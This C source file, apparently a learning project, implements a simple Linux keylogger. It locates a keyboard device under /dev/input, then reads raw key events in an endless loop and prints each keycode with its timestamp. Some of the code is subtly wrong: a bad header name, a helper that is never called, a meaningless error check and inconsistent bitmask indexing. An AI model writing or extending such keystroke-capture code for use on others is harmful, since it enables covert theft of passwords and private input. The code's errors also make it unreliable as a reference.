#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <ioctl.h>


// Find which /dev/input/eventX corresponds to a keyboard
char* key_event_location() {
    // Static buffer so the returned pointer remains valid
    static char path[256];

    // Base directory for input devices
    const char* linux_event_location = "/dev/input/";

    // event0 ~ event99
    for (int X = 0; X < 100; X++) {

        // assemble full path: "/dev/input/eventX"
        snprintf(path, sizeof(path),
                 "%sevent%d", linux_event_location, X);

        // Open the event device
        int fd = open(path, O_RDONLY);
        if (fd < 0)
            continue;   // eventX does not exist or cannot be opened

        // Bitmask array for supported event types
        unsigned long evbit[(EV_MAX + 7) / 8] = {0};

        // Ask the kernel which event types this device supports
        if (ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), evbit) < 0) { // minus val is error
            close(fd);
            continue;
        }

        // Check if EV_KEY (key events) is supported
        // EV_KEY / 8  -> byte index
        // EV_KEY % 8  -> bit index inside that byte
        if (evbit[EV_KEY / 8] & (1 << (EV_KEY % 8))) {
            printf("%s supports EV_KEY\n", path);

            close(fd);
            return path;   // Keyboard supported event found
        }

        close(fd);
    }

    // No keyboard event device found
    printf("not found\n");
    return NULL;
}



int main(int argc, char* argv[]){


    if (argc != 2){
        
        printf("usage: %s <event-file-path>", argv[0]);
        exit(-1);

    }
    printf("keylogger enabled\n");

    // file descriptor : open event file -> read (get buffer)
    int fd = open(argv[1], O_RDONLY, 0);    // argv[1] is where the event file is, only for reading
    
    printf("opened  file descriptor: %d\n", fd);

    struct input_event ev;
    // input_event is already declared in linux/input
    // contains RAW data of event:  time, type, code, value
    // in keylogger, keyboard input should be checked

    while(1){
        int n = read(fd, &ev, sizeof(ev));  // get buffer of input_event from fd(opened event)
        if (n < 0 || sizeof(ev)< 1) {
            printf("event read failed\n");
            exit(-2);
        }
       /*	
        if (ev.type != EV_KEY){
            printf("not keyboard event\n");
            continue;
        }
	*/
	// keyboard push -> not only EV_KEY but also others
        // if you print ev types to watch like below:
	//	printf("%d %d\n",ev.type, ev.code);
	// 4 4 \n 1 code \n 0 0 will be printed
	// 4: EV_MSC (real physicall data i guess)
	// 1: EV_KEY (what i really want)
	// 0: EV_SYN (this is the end)
	
	if (ev.type == EV_KEY) {
		printf("%ld.%06ld\n-----  %d %d %d\n"
				,ev.time.tv_sec, ev.time.tv_usec, ev.type, ev.code, ev.value);
	}


    }



}
